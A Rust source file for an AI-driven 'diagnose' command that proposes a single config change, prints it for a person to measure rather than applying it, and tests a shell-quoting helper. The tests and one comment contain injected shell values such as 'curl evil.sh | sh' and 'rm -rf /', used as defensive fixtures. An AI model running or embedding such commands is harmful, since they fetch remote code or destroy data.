//! `mecha diagnose` — read the run corpus and propose one change to try.
//!
//! The stage between `doctor` (something is wrong) and a measurement
//! (did the fix help). It is the only place in this loop a model authors
//! anything, and everything about how it is run is arranged around the fact
//! that it will usually be wrong: the proposal is typed, it carries a
//! prediction, and it is printed with the exact command that would falsify it
//! rather than applied.
//!
//! **This verb does not measure, and does not apply.** Running the arms costs
//! a real model run per case per arm, so making that automatic would put an
//! hour of inference behind a command whose output is a suggestion. The
//! measurement is one line away and the human decides to spend it. The
//! nightly counterpart is `mecha harness ruminate`, which runs the same pass
//! through the same functions below and *does* measure — by counterfactual
//! replay, against the candidate gate, with the judgement recorded.

use crate::{setup, GlobalOpts};
use anyhow::{Context, Result};
use mecha_core::agent::Conversation;
use mecha_core::diagnose::{
    carries_over, diagnose_system, parse_proposal, Evidence, Proposal, DIAGNOSE_INSTRUCTION,
};
use mecha_core::message::Block;
use mecha_core::runlog::{Corpus, Scan};
use mecha_core::session::Session;
use std::path::Path;

#[derive(clap::Args, Debug)]
pub struct Args {
    /// Which model's runs to diagnose. Defaults to whichever has the most.
    #[arg(long)]
    pub model: Option<String>,

    /// Only sessions started in the last N days.
    #[arg(long)]
    pub days: Option<i64>,

    /// Stop after this many sessions, newest first.
    #[arg(long, short = 'n', default_value_t = 200)]
    pub limit: usize,

    /// Only sessions rooted at this path or beneath it.
    ///
    /// Not `--workspace`: that is the global flag naming the path jail, and
    /// these are opposite questions — where this run may read, versus where
    /// the runs being read from were standing.
    #[arg(long, value_name = "PATH")]
    pub from_workspace: Option<std::path::PathBuf>,

    /// Print the brief the diagnostician would be handed, and stop.
    ///
    /// The cheap way to see what it is reasoning from — and the honest way to
    /// find out that the corpus does not yet say anything, before paying for
    /// a run that would invent something to say.
    #[arg(long)]
    pub dry_run: bool,
}

/// Scan the run corpus and pick one model's slice — one model, because a rate
/// blended across two describes neither. `Ok(None)` means the corpus holds no
/// recorded outcomes at all, which callers report in their own register: an
/// error at a terminal, a quiet skip at 03:30. Two emptinesses are *not*
/// that, on either path, and return an error instead: a store with
/// transcripts it could not read, and a store holding only smoke-test
/// sessions the diagnosis excludes — a rotting store and a filter working
/// are findings, and at 03:30 a non-zero exit is the register they get.
pub fn corpus_slice(
    want: Option<&str>,
    days: Option<i64>,
    limit: usize,
    workspace: Option<std::path::PathBuf>,
) -> Result<Option<(String, Corpus, usize)>> {
    let dir = Session::default_dir()?;
    let since = days.map(|d| chrono::Utc::now() - chrono::Duration::days(d));
    // Canonicalized, or the filter compares a path the user typed against
    // paths the store recorded canonically — `~/.mecha/work/../work/morning`
    // and a trailing slash both match nothing, silently. A path that does not
    // resolve is reported and refused rather than quietly matching nothing:
    // the flag scopes an unattended nightly, and a typo that reads as "no runs
    // recorded" defers the night for a reason nobody can see.
    let workspace = resolve_workspace_filter(workspace)?;
    let corpus = Corpus::scan(
        &dir,
        &Scan {
            max_sessions: Some(limit),
            since,
            workspace: workspace.clone(),
            // A diagnosis over smoke tests would send a change at code that
            // was only ever exercised by a test. The same admission is
            // applied to the measurement half's episode draw
            // (`harness_probe`'s `Scan::admits`), so both halves of one
            // night see one population; the surface filter is not exposed
            // on either, because a candidate is measured against every
            // surface it will run in.
            kind: None,
            include_tests: false,
        },
    )?;
    let sessions_read = corpus.sessions_read;
    if corpus.is_empty() {
        // "Nothing matched this filter" and "nothing has been recorded" are
        // opposite findings, and returning the same `None` for both made a
        // prefix miss indistinguishable from an empty store. A dash is never
        // zero — and the caller cannot recover the distinction, because by
        // here the filter has already been applied.
        if let Some(w) = &workspace {
            // **Three outcomes, not two**, and the first two rounds of this
            // branch got the count wrong in both directions. `sessions_read`
            // increments *after* the workspace filter and *before* rows are
            // pushed, so it is the discriminator: zero means nothing was
            // rooted there, non-zero means sessions were and none of them
            // recorded an outcome. A draft removed the number as meaningless
            // — it is the meaningful one — after an earlier draft printed it
            // as a store total, which it is not.
            //
            // Live on 2026-08-31: `~/.mecha/work/frontdoor` held 13 sessions
            // and no outcomes, and was reported as "the filter matched
            // nothing" — the wrong finding, on the branch whose subject is
            // not conflating two zeros.
            // A third zero, and the last one this branch found: `scan` counts
            // a session as read only *after* `outcomes_attributed` succeeds,
            // so a torn transcript lands in `unreadable` and leaves
            // `sessions_read` at nought. Reporting that as "the filter matched
            // nothing" turns a rotting store into a typo. `unreadable` exists
            // for exactly this and its own doc says so — an unreadable store
            // is a finding, not an empty queue.
            if sessions_read == 0 && corpus.unreadable > 0 {
                anyhow::bail!(
                    "no readable sessions are rooted under {}, and {} transcript(s) in the \
                     store could not be read at all — which is a damaged store rather than a \
                     filter that matched nothing. `mecha doctor` reports on the session \
                     store.",
                    w.display(),
                    corpus.unreadable
                );
            }
            // The fourth zero, and the one the smoke-test mark created:
            // every session rooted here was recorded as a test and the
            // diagnosis excludes those by design, so this is the filter
            // working — not a prefix typo, and not an empty store (found
            // on review, after CLAUDE.md started telling smoke tests to
            // set the mark). After the unreadable finding, never ahead of
            // it: a rotting store must not read as a filter working
            // (found on the next review pass).
            if sessions_read == 0 && corpus.hidden_tests > 0 {
                anyhow::bail!(
                    "the only sessions rooted under {} are {} smoke-test session(s) \
                     (`MECHA_SESSION_KIND=test`), which the diagnosis excludes — a \
                     candidate is measured against real use, and there is none here yet.",
                    w.display(),
                    corpus.hidden_tests
                );
            }
            if sessions_read == 0 {
                anyhow::bail!(
                    "no sessions are rooted under {} — the filter matched nothing, which is \
                     not the same as an empty store. `mecha diagnose --dry-run` without \
                     --from-workspace lists the workspaces that do have runs.",
                    w.display()
                );
            }
            anyhow::bail!(
                "{sessions_read} session(s) are rooted under {}, and none of them recorded a \
                 finished run — so there is nothing to diagnose from, which is a different \
                 finding from the filter matching nothing. A session records an outcome only \
                 when a run completes under it.",
                w.display()
            );
        }
        // The same order as the `--from-workspace` arm: a rotting store
        // outranks a filter working, so the unreadable finding comes first
        // (found on review as an asymmetry between the two arms).
        if sessions_read == 0 && corpus.unreadable > 0 {
            anyhow::bail!(
                "no readable sessions recorded an outcome, and {} transcript(s) in the store \
                 could not be read at all — a damaged store rather than an empty one. `mecha \
                 doctor` reports on the session store.",
                corpus.unreadable
            );
        }
        if corpus.hidden_tests > 0 && sessions_read == 0 {
            anyhow::bail!(
                "the store holds only {} smoke-test session(s) (`MECHA_SESSION_KIND=test`), \
                 which the diagnosis excludes — nothing recorded as real use yet.",
                corpus.hidden_tests
            );
        }
        return Ok(None);
    }
    let by_model = corpus.by_model();
    let picked = match want {
        Some(want) => {
            let slice = by_model
                .get(want)
                .with_context(|| format!("no recorded runs for model `{want}`"))?;
            (want.to_string(), slice.clone())
        }
        None => {
            let (model, slice) = by_model
                .iter()
                .max_by_key(|(_, c)| c.len())
                .expect("corpus is not empty");
            (model.clone(), slice.clone())
        }
    };
    Ok(Some((picked.0, picked.1, sessions_read)))
}

/// Build the evidence brief for one model's slice: counters, plus doctor's
/// own findings about runs and triggers — machine-authored text, the only
/// prose in the brief — plus whatever history the caller wants the
/// diagnostician to not re-derive.
pub fn evidence_for(model: &str, slice: &Corpus, history: Vec<String>) -> Evidence {
    let mut evidence = Evidence::of(model, slice);
    if let Ok(home) = mecha_core::work::mecha_home() {
        for finding in mecha_core::doctor::examine(&home, chrono::Utc::now())
            .into_iter()
            .filter(|f| f.component == "runs" || f.component == "triggers")
        {
            evidence
                .findings
                .push(format!("{} — {}", finding.summary, finding.detail));
        }
    }
    evidence.history = history;
    evidence.compact_at_fraction = compact_at_fraction(slice);
    evidence
}

/// The fraction of the context window at which compaction fires for the runs
/// in this slice, when it is knowable.
///
/// **The provider comes from the corpus, not from the default.** The slice is
/// keyed by model and every `RunRow` records the provider that served it, so
/// looking the window up on `cfg.provider(None)` would divide this model's
/// token threshold by a different model's window — 40 000 against a 65 536
/// window reads as 61%, against a 200 000 window as 20%, and only one of
/// those describes the runs being diagnosed. A slice whose rows disagree
/// about the provider yields `None`: there is no single threshold to name.
///
/// **`None` whenever there is no fraction to report — which is not the same
/// set as `AgentConfig::compact_at` returning `None`.** With neither
/// `compact_at_tokens` nor a window there is no threshold at all, and an
/// earlier draft returned `Some(COMPACT_FRACTION)` there — printing
/// "compaction fires at 66.0% ... never needed, NOT disabled" for a
/// configuration in which it is genuinely disabled. With an explicit
/// `compact_at_tokens` and no window, `compact_at` returns `Some(n)` and
/// compaction IS on; what is missing is the denominator, so there is no
/// fraction to put beside a pressure reading. Both yield `None` here, for
/// two different reasons, and conflating them was the earlier wording.
///
/// Still the *currently configured* threshold rather than the one each run
/// used. `RunConfig` does record `compact_at_tokens` per session, so a
/// per-row threshold is reachable and is the better answer; it is not this
/// change, and the brief says "fires at" rather than "fired at" so the
/// sentence stays true of the corpus as configured now.
fn compact_at_fraction(slice: &Corpus) -> Option<f64> {
    compact_at_fraction_of(&mecha_core::config::Config::load_global().ok()?, slice)
}

/// [`compact_at_fraction`] against an explicit config, so the branch that
/// decides whether the reassuring sentence appears at all is testable.
///
/// Split out on review: the renderer had five tests and this function had
/// none, and it *could not* get one while it loaded the config itself. Its
/// own doc records that an earlier draft got one of these branches wrong in
/// the direction that prints "never needed, NOT disabled" for a config where
/// compaction is genuinely off — the exact regression nothing would have
/// caught.
fn compact_at_fraction_of(cfg: &mecha_core::config::Config, slice: &Corpus) -> Option<f64> {
    // One provider, or nothing to name.
    let mut providers = slice.rows.iter().map(|r| r.provider.as_str());
    let provider_name = providers.next()?;
    if providers.any(|p| p != provider_name) {
        return None;
    }
    let (_, provider) = cfg.provider(Some(provider_name)).ok()?;
    let window = provider.context_window;

    match cfg.agent.compact_at_tokens {
        // Derived: the threshold *is* the fraction — but only when there is
        // a window for it to be a fraction of.
        None => window.map(|_| mecha_core::config::AgentConfig::COMPACT_FRACTION),
        Some(tokens) => {
            let window = window?;
            (window > 0).then(|| tokens as f64 / window as f64)
        }
    }
}

/// The checkout the diagnostician may read, if one is configured and present.
///
/// Global config only, by construction — `[harness]` is stripped from project
/// layers — and re-read here rather than taken from the caller's `Prepared`,
/// because this decides the workspace that `prepare` is then called with.
///
/// A configured directory that is missing is reported and then treated as
/// absent, not as a hard failure: a nightly that stops entirely because a
/// checkout moved is worse than one that diagnoses from counters and says it
/// did. What must never happen is the third thing — proceeding while the
/// prompt still claims the source is readable.
fn source_dir() -> Result<(Option<std::path::PathBuf>, Option<std::path::PathBuf>)> {
    let cfg = mecha_core::config::Config::load_global()?;
    // The middle term of `prepare_tools`' own fallback, handed back so the
    // caller can mirror it exactly. Skipping it was review's finding: the jail
    // resolved here was `configured → global.workspace → cwd` while
    // `setup.rs` resolves `opts.workspace → cfg.tools.workspace → cwd`, and
    // with `global_config_only` pinned a global `[tools] workspace` is
    // precisely the reachable difference — so the prompt could name a
    // directory the jail would refuse, or claim blindness on a run whose
    // `fs_read` reached the source. This PR's own bug, in both directions, one
    // fallback term down.
    let tools_workspace = cfg.tools.workspace.clone();
    let Some(dir) = cfg.harness.source_dir else {
        return Ok((None, tools_workspace));
    };
    match dir.canonicalize() {
        Ok(dir) if dir.is_dir() => Ok((Some(dir), tools_workspace)),
        _ => {
            eprintln!(
                "mecha: [harness] source_dir names {}, which is not a readable \
                 directory — diagnosing from counters alone",
                dir.display()
            );
            Ok((None, tools_workspace))
        }
    }
}

/// Resolve a `--from-workspace` to the form the store recorded.
///
/// **One place, because two callers compare against the same recorded paths
/// and only one of them was resolving.** `corpus_slice` canonicalized
/// internally and threw the result away; `ruminate` then handed the raw clap
/// value to `draw_episodes`, so a relative path, a `..` component or a
/// symlinked home scoped the *brief* and matched nothing in the *draw* — and
/// the candidate was staged "no replayable sessions recorded", which is the
/// wrong finding and the same two-zeros conflation the bail-out below exists
/// to stop. Found in review, in the fix for that conflation.
///
/// A path that does not resolve is an error rather than a filter that matches
/// nothing, for the same reason: on the unattended path a typo would otherwise
/// defer the night silently.
pub fn resolve_workspace_filter(
    workspace: Option<std::path::PathBuf>,
) -> Result<Option<std::path::PathBuf>> {
    match workspace {
        None => Ok(None),
        Some(w) => Ok(Some(w.canonicalize().with_context(|| {
            format!(
                "--from-workspace {} does not resolve to a directory",
                w.display()
            )
        })?)),
    }
}

/// Does this directory actually hold this program's source and documentation?
///
/// Asked of the directory rather than inferred from config, for the reason
/// every other "ask the artifact" check here exists: a path in a config file
/// is a claim about the filesystem, and the filesystem is available. Two
/// markers rather than one so a directory that merely *contains* a `docs/`
/// does not pass.
fn holds_source(dir: &Path) -> bool {
    dir.join("mecha-core").join("src").is_dir() && dir.join("docs").is_dir()
}

/// What one diagnostic pass produced.
pub struct Diagnosis {
    /// The model's full reply, reasoning included.
    pub reply: String,
    pub outcome: DiagnosisOutcome,
}

pub enum DiagnosisOutcome {
    /// It declined to propose, or wrote a block that could not be measured.
    /// Both are better than a change nobody can falsify.
    NoProposal,
    /// Refused: the proposal reproduced a run of words from what it read.
    /// The quoted run rides along for the human-facing explanation.
    Quoted {
        run: String,
    },
    Proposal(Proposal),
}

/// Run the diagnostician once over an evidence brief and vet what came back.
///
/// One code path for `mecha diagnose` and the nightly, because two spellings
/// of "read-only, no outbox, no learned rules" is how one of them silently
/// stops being true.
pub async fn run_diagnostician(global: &GlobalOpts, evidence: &Evidence) -> Result<Diagnosis> {
    // The diagnostician's most useful input is this repository's own
    // documentation, which records why each mechanism exists and is what stops
    // a proposal unpicking something load-bearing. Reaching it takes an
    // explicit grant, because "wherever the caller is standing" was not one:
    // the nightly stands in `~/.mecha/work/ruminate/`, on purpose and for a
    // good reason, and that directory is empty.
    //
    // **The jail root and the config root are separated here rather than
    // reconciled.** `scripts/ruminate.sh` refuses to stand in a checkout so
    // that a project's `mecha.toml` never gets in front of an unattended run,
    // and that refusal is right. But `prepare_tools` discovers config from the
    // *cwd* and roots the jail at the *workspace*, so the two were never the
    // same question. Standing outside, pointing the workspace in, and pinning
    // `global_config_only` gets the documentation without the project layer —
    // and pins it belt-and-braces, so this holds even if someone later runs
    // the nightly from a checkout by hand.
    // **The grant is the jail root, not the config key**, and keying the
    // prompt off the key was this PR's own bug reflected. Configured, the
    // sighted paragraph over-claimed; unconfigured, the blind one under-claims
    // — `mecha diagnose` run by hand from the checkout gets a working
    // `fs_read` over the source while being told it cannot read anything and
    // forbidden from naming a key the brief did not name first. Both are a
    // prompt disagreeing with the surface it was given.
    //
    // So resolve the root the way `prepare_tools` will, then *ask the
    // directory* whether it holds the source rather than inferring it from
    // which branch produced the path. That is the same move as `/props` and
    // `--json` elsewhere here: the artifact answers, config does not get to
    // assert. A `source_dir` pointed somewhere wrong is caught by it too.
    let (configured, tools_workspace) = source_dir()?;
    // Mirrors `setup::prepare_tools` exactly — `opts.workspace` (which is
    // `configured` or the caller's), then `[tools] workspace`, then the cwd.
    // Any term dropped here is a term where the prompt and the jail disagree.
    // **`--workspace` first, then `[harness] source_dir`.** A flag losing to
    // config inverts the layering every other command follows, and made
    // `--workspace` a silent no-op for this one. The nightly passes no flag,
    // so it costs the unattended path nothing.
    //
    // This order and `opts.workspace` below must move together; the `ensure!`
    // after `prepare` is what makes it impossible for them to drift apart
    // quietly.
    let jail = global
        .workspace
        .clone()
        .or_else(|| configured.clone())
        .or(tools_workspace)
        .or_else(|| std::env::current_dir().ok());
    let source = jail
        .as_deref()
        .filter(|d| holds_source(d))
        .map(Path::to_path_buf);
    let opts = GlobalOpts {
        read_only: true,
        yes: false,
        system: Some(diagnose_system(source.as_deref())),
        no_outbox: true,
        no_learned_rules: true,
        global_config_only: true,
        workspace: global.workspace.clone().or_else(|| configured.clone()),
        ..global.clone()
    };
    let prepared = setup::prepare(&opts, false).await?;
    // **The jail above is a hand-copy of `prepare_tools`' fallback chain, and
    // `prepared.workspace` is the ground truth.** Review caught that copy one
    // term short mid-branch — it omitted `[tools] workspace` — which is
    // precisely this PR's own bug: a prompt describing a directory that is not
    // the one the run can read. A copy that drifts silently would reintroduce
    // it, so the copy is checked against the original rather than trusted.
    //
    // An error rather than a warning: the system prompt is already built from
    // `jail` and describes what the model may read. Running anyway means
    // running with a prompt that is wrong about the surface, which is the
    // failure this whole branch exists to remove — and the nightly is not
    // `set -e`, so a refusal here defers one night loudly instead of
    // diagnosing from a false premise every night quietly.
    if let Some(jail) = &jail {
        let resolved = jail.canonicalize().unwrap_or_else(|_| jail.clone());
        anyhow::ensure!(
            resolved == prepared.workspace,
            "the diagnostician's prompt was built for {} but the path jail resolved to {} — \
             `run_diagnostician` mirrors `setup::prepare_tools`' workspace fallback by hand \
             and the two have drifted. Fix the copy; do not diagnose from a prompt that is \
             wrong about what can be read.",
            resolved.display(),
            prepared.workspace.display()
        );
    }
    match (&source, &configured) {
        (Some(dir), _) => eprintln!("reading source and docs from {}", dir.display()),
        // Configured and yet not holding the source: the loudest of the three,
        // because it is the case where someone believes the grant is in place.
        (None, Some(dir)) => eprintln!(
            "mecha: [harness] source_dir names {}, which does not look like a checkout \
             of this program (no `mecha-core/src` and `docs` under it) — diagnosing from \
             counters alone",
            dir.display()
        ),
        (None, None) => eprintln!(
            "no source checkout reachable from the path jail — diagnosing from counters \
             alone, and the prompt says so rather than claiming otherwise"
        ),
    }

    eprintln!(
        "diagnosing {} run(s) of `{}` · {} ({})",
        evidence.runs, evidence.model, prepared.model, prepared.provider_name
    );

    let brief = evidence.brief();
    let mut convo = Conversation::user(format!("{brief}\n---\n{DIAGNOSE_INSTRUCTION}"));
    let outcome = prepared.agent.run(&mut convo, None).await?;

    let Some(proposal) = parse_proposal(&outcome.text) else {
        return Ok(Diagnosis {
            reply: outcome.text,
            outcome: DiagnosisOutcome::NoProposal,
        });
    };

    // What it read, so a lifted sentence can be caught. Every tool result in
    // the conversation: the source it opened, the pages it fetched, the
    // searches it ran.
    let sources: Vec<String> = convo
        .messages
        .iter()
        .flat_map(|m| &m.content)
        .filter_map(|b| match b {
            Block::ToolResult { content, .. } => Some(content.clone()),
            _ => None,
        })
        .collect();
    let refs: Vec<&str> = sources.iter().map(String::as_str).collect();
    let quoted =
        carries_over(&proposal.rationale, &refs).or_else(|| carries_over(&proposal.change, &refs));

    Ok(Diagnosis {
        reply: outcome.text,
        outcome: match quoted {
            Some(run) => DiagnosisOutcome::Quoted { run },
            None => DiagnosisOutcome::Proposal(proposal),
        },
    })
}

pub async fn execute(global: &GlobalOpts, args: Args) -> Result<()> {
    let Some((model, slice, _)) = corpus_slice(
        args.model.as_deref(),
        args.days,
        args.limit,
        args.from_workspace.clone(),
    )?
    else {
        let dir = Session::default_dir()?;
        anyhow::bail!(
            "no recorded run outcomes in {} — outcomes are recorded from the release that \
             added the record, so the corpus fills as you use it",
            dir.display(),
        );
    };

    // The interactive verb shows history too: a person about to spend a
    // measurement deserves to know what already failed one.
    let history = harness_history().unwrap_or_default();
    let evidence = evidence_for(&model, &slice, history);

    if args.dry_run {
        println!("{}", evidence.brief());
        return Ok(());
    }

    let diagnosis = run_diagnostician(global, &evidence).await?;
    println!("{}\n", diagnosis.reply.trim());

    match diagnosis.outcome {
        DiagnosisOutcome::NoProposal => {
            println!(
                "no proposal — the diagnostician either found nothing worth changing or wrote a \
                 block that could not be measured. Both are better than a change nobody can \
                 falsify."
            );
        }
        DiagnosisOutcome::Quoted { run } => {
            println!("── proposal ──");
            println!(
                "REFUSED: the proposal reproduces what it read — \"{run}\". A conclusion drawn \
                 from a source is a proposal; a sentence lifted from one is the source's, and a \
                 sentence in the prompt prefix is the longest-lived thing in this system."
            );
        }
        DiagnosisOutcome::Proposal(proposal) => {
            println!("── proposal ──");
            println!("class:     {:?}", proposal.class);
            println!("change:    {}", proposal.change);
            println!("predicts:  lower {:?}", proposal.metric);
            println!("because:   {}", proposal.rationale);

            println!("\nnothing to do here yet — measure it:");
            // Shell-quoted, because `change` is model-authored and the
            // diagnostician runs with `web_search` and `http_fetch`: a
            // proposal that clears the reproduction check can still carry
            // shell metacharacters, and this line is printed to be pasted.
            // `max_turns=40; curl … | sh #` reads as a plausible command
            // otherwise.
            println!(
                "  mecha eval --ab-config {} eval/cases.jsonl",
                shell_quote(&proposal.change)
            );
            println!(
                "\nthat runs the case set twice and judges the difference against a holdout — \
                 or `mecha harness ruminate` measures it against replayed sessions overnight. \
                 Until one of them does, this is a guess: automated failure attribution is \
                 right about which step failed roughly one time in seven, which is exactly why \
                 nothing here is applied."
            );
        }
    }
    Ok(())
}

/// One line per already-disposed candidate, for the brief. Best-effort: a
/// missing store is an empty history, not an error. Newest 20 only — the
/// brief rides in a real request every night, and the dedupe in `harness
/// ruminate` catches an exact re-derivation regardless of age.
pub fn harness_history() -> Result<Vec<String>> {
    let store = mecha_core::harness::HarnessStore::open_default()?;
    let all = store.all()?;
    let newest_20 = all.len().saturating_sub(20);
    Ok(all[newest_20..]
        .iter()
        .map(|c| {
            let verdict = match c.status.as_str() {
                mecha_core::harness::STATUS_REJECTED => {
                    format!(
                        "rejected: {}",
                        c.reason.as_deref().unwrap_or("measured worse")
                    )
                }
                mecha_core::harness::STATUS_REVERTED => "accepted, then reverted by hand".into(),
                mecha_core::harness::STATUS_ACCEPTED => "accepted and live".into(),
                _ => "staged, awaiting a person".into(),
            };
            format!("{} ({:?}) — {verdict}", c.change, c.class)
        })
        .collect())
}

/// Single-quote a value for a shell, so a printed command cannot become a
/// different command. POSIX-portable: end the quoted run, emit an escaped
/// quote, start a new one.
pub fn shell_quote(value: &str) -> String {
    if !value.is_empty()
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "=_-./:".contains(c))
    {
        return value.to_string();
    }
    format!("'{}'", value.replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── The threshold derivation ────────────────────────────────────────
    //
    // Added on review: the renderer had five tests and this function had
    // none, and could not get one while it loaded config itself. Its doc
    // records that an earlier draft returned `Some(COMPACT_FRACTION)` with
    // no window — which prints "never needed, NOT disabled" for a config
    // where compaction is genuinely off. These are what would catch that.

    fn row(provider: &str, model: &str) -> mecha_core::runlog::RunRow {
        mecha_core::runlog::RunRow {
            session_id: "s".into(),
            started_at: chrono::Utc::now(),
            provider: provider.into(),
            model: model.into(),
            title: None,
            workspace: std::path::PathBuf::from("/tmp"),
            run: 0,
            stats: Default::default(),
        }
    }

    fn corpus(rows: Vec<mecha_core::runlog::RunRow>) -> Corpus {
        Corpus {
            rows,
            sessions_read: 1,
            ..Default::default()
        }
    }

    /// **The invariant the other tests could not see.** All three set
    /// `default_provider` to the same name the rows carry, so
    /// `cfg.provider(Some(name))` and `cfg.provider(None)` returned the
    /// same thing and the fix was unmeasured. Here the default provider has
    /// a different window from the one the rows name: the fraction must be
    /// computed against the ROWS\' provider, or the brief divides this
    /// model\'s threshold by another model\'s window.
    #[test]
    fn the_window_comes_from_the_rows_provider_not_the_default() {
        let mut cfg = mecha_core::config::Config::default();
        cfg.agent.compact_at_tokens = Some(40_000);
        cfg.providers.insert(
            "small".into(),
            mecha_core::config::ProviderConfig {
                context_window: Some(65_536),
                ..Default::default()
            },
        );
        cfg.providers.insert(
            "big".into(),
            mecha_core::config::ProviderConfig {
                context_window: Some(200_000),
                ..Default::default()
            },
        );
        // The default is the SMALL window; the rows ran on the big one.
        cfg.default_provider = "small".into();
        let got = compact_at_fraction_of(&cfg, &corpus(vec![row("big", "m")])).unwrap();
        assert!(
            (got - 0.2).abs() < 1e-9,
            "40000/200000 = 0.20 against the rows\' provider; \
             40000/65536 = 0.61 would be the default\'s window — got {got}"
        );
    }

    /// Unset `compact_at_tokens` with a window: the threshold *is* the
    /// fraction.
    #[test]
    fn a_derived_threshold_is_the_fraction() {
        let mut cfg = mecha_core::config::Config::default();
        cfg.agent.compact_at_tokens = None;
        cfg.providers.insert(
            "local".into(),
            mecha_core::config::ProviderConfig {
                context_window: Some(262_144),
                ..Default::default()
            },
        );
        cfg.default_provider = "local".into();
        assert_eq!(
            compact_at_fraction_of(&cfg, &corpus(vec![row("local", "m")])),
            Some(mecha_core::config::AgentConfig::COMPACT_FRACTION)
        );
    }

    /// **The draft bug.** An explicit token count with no window has no
    /// fraction — `AgentConfig::compact_at` returns `None` there, and so
    /// must this, or the brief reassures about a threshold that does not
    /// exist.
    #[test]
    fn an_explicit_threshold_without_a_window_is_unknown() {
        let mut cfg = mecha_core::config::Config::default();
        cfg.agent.compact_at_tokens = Some(16_384);
        cfg.providers.insert(
            "local".into(),
            mecha_core::config::ProviderConfig {
                context_window: None,
                ..Default::default()
            },
        );
        cfg.default_provider = "local".into();
        assert_eq!(
            compact_at_fraction_of(&cfg, &corpus(vec![row("local", "m")])),
            None
        );
    }

    /// Rows disagreeing about the provider name no single threshold.
    #[test]
    fn a_mixed_provider_slice_has_no_one_threshold() {
        let mut cfg = mecha_core::config::Config::default();
        cfg.agent.compact_at_tokens = None;
        cfg.providers.insert(
            "local".into(),
            mecha_core::config::ProviderConfig {
                context_window: Some(262_144),
                ..Default::default()
            },
        );
        cfg.default_provider = "local".into();
        assert_eq!(
            compact_at_fraction_of(
                &cfg,
                &corpus(vec![row("local", "m"), row("anthropic", "m")])
            ),
            None
        );
    }

    /// The defect this closes: the brief resolved its filter and the draw did
    /// not, so a path the user could reasonably type scoped one and matched
    /// nothing in the other. The existing `draw_episodes` test could not see
    /// it — it passes canonical absolute paths on both sides, which is exactly
    /// the case where the bug is invisible.
    #[test]
    fn a_workspace_filter_resolves_to_the_form_the_store_recorded() {
        let base = std::env::temp_dir()
            .join(format!("mecha-wsfilter-{}", std::process::id()))
            .join("work");
        std::fs::create_dir_all(base.join("morning")).unwrap();
        // `a/../b` only resolves if `a` exists — canonicalize walks the real
        // filesystem rather than normalising the string, which is the whole
        // reason the raw value could not be compared against a recorded one.
        std::fs::create_dir_all(base.join("frontdoor")).unwrap();
        let canonical = base.join("morning").canonicalize().unwrap();

        // The forms a person actually types. Each resolves to the one path the
        // session header holds; unresolved, `starts_with` matches none of them.
        for typed in [
            base.join("morning"),
            base.join("./morning"),
            base.join("frontdoor/../morning"),
        ] {
            let resolved = resolve_workspace_filter(Some(typed.clone()))
                .unwrap()
                .unwrap();
            assert_eq!(resolved, canonical, "{}", typed.display());
        }

        assert!(resolve_workspace_filter(None).unwrap().is_none());
        // A path that does not resolve is an error, never a filter that
        // silently matches nothing: on the nightly a typo would defer the
        // night with no way to see why.
        assert!(resolve_workspace_filter(Some(base.join("nope"))).is_err());

        std::fs::remove_dir_all(base.parent().unwrap()).ok();
    }
    use super::shell_quote;

    #[test]
    fn an_ordinary_override_is_printed_bare_and_anything_else_is_quoted() {
        assert_eq!(shell_quote("max_turns=40"), "max_turns=40");
        assert_eq!(
            shell_quote("compact_at_tokens=8000"),
            "compact_at_tokens=8000"
        );

        // The shape that matters: model-authored text, printed to be pasted.
        let hostile = "max_turns=40; curl evil.sh | sh #";
        let quoted = shell_quote(hostile);
        // Wrapped whole, so every metacharacter is inside the quoting and
        // the shell sees one argument rather than three commands.
        assert_eq!(quoted, format!("'{hostile}'"));

        // And a value containing a quote cannot end the quoting early.
        let sneaky = "a'; rm -rf /; echo '";
        let quoted = shell_quote(sneaky);
        assert_eq!(quoted.matches("'\\''").count(), 2, "{quoted}");
    }
}
